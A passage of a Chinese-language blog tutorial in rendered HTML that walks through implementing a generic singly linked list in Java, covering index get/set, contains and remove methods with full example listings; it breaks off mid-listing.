class="comment">//脚标清0</span></span><br><span class="line">        <span class="built_in">this</span>.returnData = <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="built_in">this</span>.count];<span class="comment">//根据已有的长度开辟数组</span></span><br><span class="line">        <span class="built_in">this</span>.root.toArrayNode();<span class="comment">//利用Node类进行递归数据获取</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.returnData;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> E <span class="title function_">get</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (index &gt;= <span class="built_in">this</span>.count) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//索引数据的获取应该由Node类完成</span></span><br><span class="line">        <span class="built_in">this</span>.foot = <span class="number">0</span>;<span class="comment">//重置索引的下标</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.root.getNode(index);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">set</span><span class="params">(<span class="type">int</span> index, E data)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (index &gt;= <span class="built_in">this</span>.count) &#123;</span><br><span class="line">            <span class="keyword">return</span>;<span class="comment">//方法结束</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//索引数据的获取应该由Node类完成</span></span><br><span class="line">        <span class="built_in">this</span>.foot = <span class="number">0</span>;<span class="comment">//重置索引的下标</span></span><br><span class="line">        <span class="built_in">this</span>.root.setNode(index, data);<span class="comment">//修改数据</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test64</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        ILink&lt;String&gt; all = <span class="keyword">new</span> <span class="title class_">LinkImpl</span>&lt;&gt;();</span><br><span class="line">        System.out.println(<span class="string">&quot;增加之前数据个数：&quot;</span> + all.size1() + <span class="string">&quot;、是否为空集合：&quot;</span> + all.isEmpty());</span><br><span class="line">        all.add1(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        all.add1(<span class="string">&quot;world&quot;</span>);</span><br><span class="line">        all.add1(<span class="string">&quot;mes9s0&quot;</span>);</span><br><span class="line">        all.set(<span class="number">1</span>,<span class="string">&quot;世界&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;增加之后数据个数：&quot;</span> + all.size1() + <span class="string">&quot;、是否为空集合：&quot;</span> + all.isEmpty());</span><br><span class="line">        Object[] result = all.toArray();</span><br><span class="line">        <span class="keyword">for</span> (Object obj : result) &#123;</span><br><span class="line">            System.out.println(obj);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;--------------数据获取的分割线----------------&quot;</span>);</span><br><span class="line">        System.out.println(all.get(<span class="number">0</span>));</span><br><span class="line">        System.out.println(all.get(<span class="number">1</span>));</span><br><span class="line">        System.out.println(all.get(<span class="number">4</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073709.jpg"                      alt="image-20220802025543787"                ></p><p>​    这种操作的时间复杂度也是n，因为依然需要数据的遍历处理。</p><h5 id="链表（判断数据是否存在）"><a href="#链表（判断数据是否存在）" class="headerlink" title="链表（判断数据是否存在）"></a>链表（判断数据是否存在）</h5><p>​    判断数据是否存在：public boolean contains(E data)</p><p>​    在一个集合里往往会保存有大量的数据，有些时候需要判断某个数据是否存在，这个时候就可以通过对象比较的模式（equals()方法）来进行判断。</p><p>​    1、在ILink接口中追加判断的方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">contains</span><span class="params">(E data)</span>;<span class="comment">//判断数据是否存在</span></span><br></pre></td></tr></table></figure><p>​    2、在Node类中进行依次判断</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">containsNode</span><span class="params">(E data)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.data.equals(data)) &#123;<span class="comment">//对象比较</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.next == <span class="literal">null</span>) &#123;<span class="comment">//无后续节点</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.next.containsNode(data);<span class="comment">//向后继续判断</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    3、在LinkImpl的子类里实现该方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">contains</span><span class="params">(E data)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (data == <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.root.containsNode(data);<span class="comment">//交给Node类判断</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>范例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> two;</span><br><span class="line"></span><br><span class="line"><span class="comment">//链表数据增加</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">ILink</span>&lt;E&gt; &#123; <span class="comment">//设置泛型避免安全隐患</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add1</span><span class="params">(E e)</span>;<span class="comment">//增加节点</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">size1</span><span class="params">()</span>;<span class="comment">//获取数据个数</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isEmpty</span><span class="params">()</span>;<span class="comment">//判断空集合</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object[] toArray();<span class="comment">//将集合元素以数组形式返回</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> E <span class="title function_">get</span><span class="params">(<span class="type">int</span> index)</span>;<span class="comment">//根据索引找到数据</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">set</span><span class="params">(<span class="type">int</span> index, E data)</span>;<span class="comment">//修改索引数据</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">contains</span><span class="params">(E data)</span>;<span class="comment">//判断数据是否存在</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LinkImpl</span>&lt;E&gt; <span class="keyword">implements</span> <span class="title class_">ILink</span>&lt;E&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//保存节点的数据关系</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">class</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> E data; <span class="comment">//保存的数据</span></span><br><span class="line">        <span class="keyword">private</span> Node next; <span class="comment">//保存下一个引用</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//限制node必须有数据，有数据才有意义</span></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Node</span><span class="params">(E data)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.data = data;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//第一次调用：this = LinkImpl.root;</span></span><br><span class="line">        <span class="comment">//第二次调用：this = LinkImpl.root.next;</span></span><br><span class="line">        <span class="comment">//第三次调用: this = LinkImpl.root.next.next;</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addNode</span><span class="params">(Node newNode)</span> &#123; <span class="comment">//保存新的node数据</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.next == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="built_in">this</span>.next = newNode;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">this</span>.next.addNode(newNode);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//第一次调用:this = LinkImpl.root</span></span><br><span class="line">        <span class="comment">//第二次调用:this = LinkImpl.root.next</span></span><br><span class="line">        <span class="comment">//第三次调用: this = LinkImpl.root.next.next;</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">toArrayNode</span><span class="params">()</span> &#123;</span><br><span class="line">            LinkImpl.<span class="built_in">this</span>.returnData[LinkImpl.<span class="built_in">this</span>.foot++] = <span class="built_in">this</span>.data;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.next != <span class="literal">null</span>) &#123;<span class="comment">//还有下一个数据</span></span><br><span class="line">                <span class="built_in">this</span>.next.toArrayNode();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> E <span class="title function_">getNode</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (LinkImpl.<span class="built_in">this</span>.foot++ == index) &#123;</span><br><span class="line">                <span class="comment">//索引相同</span></span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">this</span>.data;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">this</span>.next.getNode(index);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setNode</span><span class="params">(<span class="type">int</span> index, E data)</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (LinkImpl.<span class="built_in">this</span>.foot++ == index) &#123;</span><br><span class="line">                <span class="comment">//索引相同</span></span><br><span class="line">                <span class="built_in">this</span>.data = data;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">this</span>.next.setNode(index, data);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">containsNode</span><span class="params">(E data)</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.data.equals(data)) &#123;<span class="comment">//对象比较</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>.next == <span class="literal">null</span>) &#123;<span class="comment">//无后续节点</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="built_in">this</span>.next.containsNode(data);<span class="comment">//向后继续判断</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// -----------以下为Link类中定义的成员----------</span></span><br><span class="line">    <span class="keyword">private</span> Node root; <span class="comment">//保存根元素</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> count;<span class="comment">//保存数据个数</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> foot;<span class="comment">//描述的是操作数组的脚标</span></span><br><span class="line">    <span class="keyword">private</span> Object[] returnData;<span class="comment">//返回的数据保存</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// -----------以下为Link类中定义的方法----------</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add1</span><span class="params">(E e)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (e == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//数据本身是不具有关联性的,只有Node类有，那么想要实现关联处理就必须将数据包装在Node类之中</span></span><br><span class="line">        <span class="type">Node</span> <span class="variable">newNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Node</span>(e);<span class="comment">//创建一个新节点</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.root == <span class="literal">null</span>) &#123; <span class="comment">//现在没有根节点</span></span><br><span class="line">            <span class="built_in">this</span>.root = newNode; <span class="comment">//现在第一个节点作为根节点</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.root.addNode(newNode);<span class="comment">//将新节点保存在合适的位置</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">this</span>.count++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">size1</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.count;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isEmpty</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//return this.root == null;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.count == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object[] toArray() &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;<span class="comment">//无数据</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">this</span>.foot = <span class="number">0</span>;<span class="comment">//脚标清0</span></span><br><span class="line">        <span class="built_in">this</span>.returnData = <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="built_in">this</span>.count];<span class="comment">//根据已有的长度开辟数组</span></span><br><span class="line">        <span class="built_in">this</span>.root.toArrayNode();<span class="comment">//利用Node类进行递归数据获取</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.returnData;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> E <span class="title function_">get</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (index &gt;= <span class="built_in">this</span>.count) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//索引数据的获取应该由Node类完成</span></span><br><span class="line">        <span class="built_in">this</span>.foot = <span class="number">0</span>;<span class="comment">//重置索引的下标</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.root.getNode(index);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">set</span><span class="params">(<span class="type">int</span> index, E data)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (index &gt;= <span class="built_in">this</span>.count) &#123;</span><br><span class="line">            <span class="keyword">return</span>;<span class="comment">//方法结束</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//索引数据的获取应该由Node类完成</span></span><br><span class="line">        <span class="built_in">this</span>.foot = <span class="number">0</span>;<span class="comment">//重置索引的下标</span></span><br><span class="line">        <span class="built_in">this</span>.root.setNode(index, data);<span class="comment">//修改数据</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">contains</span><span class="params">(E data)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (data == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.root.containsNode(data);<span class="comment">//交给Node类判断</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test64</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        ILink&lt;String&gt; all = <span class="keyword">new</span> <span class="title class_">LinkImpl</span>&lt;&gt;();</span><br><span class="line">        System.out.println(<span class="string">&quot;增加之前数据个数：&quot;</span> + all.size1() + <span class="string">&quot;、是否为空集合：&quot;</span> + all.isEmpty());</span><br><span class="line">        all.add1(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        all.add1(<span class="string">&quot;world&quot;</span>);</span><br><span class="line">        all.add1(<span class="string">&quot;mes9s0&quot;</span>);</span><br><span class="line">        all.set(<span class="number">1</span>, <span class="string">&quot;世界&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;增加之后数据个数：&quot;</span> + all.size1() + <span class="string">&quot;、是否为空集合：&quot;</span> + all.isEmpty());</span><br><span class="line">        Object[] result = all.toArray();</span><br><span class="line">        <span class="keyword">for</span> (Object obj : result) &#123;</span><br><span class="line">            System.out.println(obj);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;--------------数据获取的分割线----------------&quot;</span>);</span><br><span class="line">        System.out.println(all.get(<span class="number">0</span>));</span><br><span class="line">        System.out.println(all.get(<span class="number">1</span>));</span><br><span class="line">        System.out.println(all.get(<span class="number">4</span>));</span><br><span class="line">        System.out.println(<span class="string">&quot;--------------数据判断的分割线----------------&quot;</span>);</span><br><span class="line">        System.out.println(all.contains(<span class="string">&quot;高&quot;</span>));</span><br><span class="line">        System.out.println(all.contains(<span class="string">&quot;hello&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073711.jpg"                      alt="image-20220802030603963"                ></p><p>​    由于整个链表没有null数据的存在，所以整体的程序在判断的时候程序直接使用每一个的节点数据发出equals()的方法调用即可。注意要把不会为null的数据写在equals()方法的前面。</p><h5 id="链表（数据删除）"><a href="#链表（数据删除）" class="headerlink" title="链表（数据删除）"></a>链表（数据删除）</h5><p>​    public void remove(E data)</p><p>​    数据的删除指的是可以从集合里面删除掉制定的一个数据内容，有就是说此时传递的是数据内容。删除操作依然需要对象比较的支持。但是对于集合数据的删除需要考虑两种情况：</p><p>​    1、要删除的是根节点数据(LinkImpl与根节点有关，所以这个判断由根节点完成)：</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073713.jpg"                      alt="image-20220803145739631"                ></p><p>​    2、要删除的不是根节点数据(由Node类负责)：</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-73715.jpg"                      alt="image-20220803145918863"                ></p><p>​    实现：</p><p>​    1、在ILink接口里面追加新的删除方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">remove</span><span class="params">(E data)</span>;<span class="comment">//数据删除方法</span></span><br></pre></td></tr></table></figure><p>​    2、在LinkImpl子类里面实现根节点的判断</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">remove</span><span class="params">(E data)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.contains(data)) &#123; <span class="comment">//判断数据是否存在</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.root.data.equals(data)) &#123; <span class="comment">//根节点为要删除节点</span></span><br><span class="line">            <span class="built_in">this</span>.root = <span class="built_in">this</span>.root.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">this</span>.count--;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    3、如果现在根节点并不是要删除的节点，那么就需要进行后续节点判断，但是请一定要记住，此时根节点已经判断完成，再判断应该从根节点下一个开始。在Node类中追加删除处理。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">removeNode</span><span class="params">(Node previous,E data)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.data.equals(data))&#123;</span><br><span class="line">        previous.next = <span class="built_in">this</span>.next;<span class="comment">//空出当前节点</span></span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.next != <span class="literal">null</span>)&#123; <span class="comment">//有后续节点</span></span><br><span class="line">            <span class="built_in">this</span>.next.removeNode(<span class="built_in">this</span>,data); <span class="comment">//向后继续删除</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    4、完善LinkImpl子类中的remove方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">remove</span><span class="params">(E data)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.contains(data)) &#123; <span class="comment">//判断数据是否存在</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.root.data.equals(data)) &#123; <span class="comment">//根节点为要删除节点</span></span><br><span class="line">            <span class="built_in">this</span>.root = <span class="built_in">this</span>.root.next; <span class="comment">//根的下一个节点</span></span><br><span class="line">        &#125;<span class="keyword">else</span> &#123; <span class="comment">//交由Node类负责删除</span></span><br><span class="line">            <span class="built_in">this</span>.root.next.removeNode(<span class="built_in">this</span>.root,data);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">this</span>.count--;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>范例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span 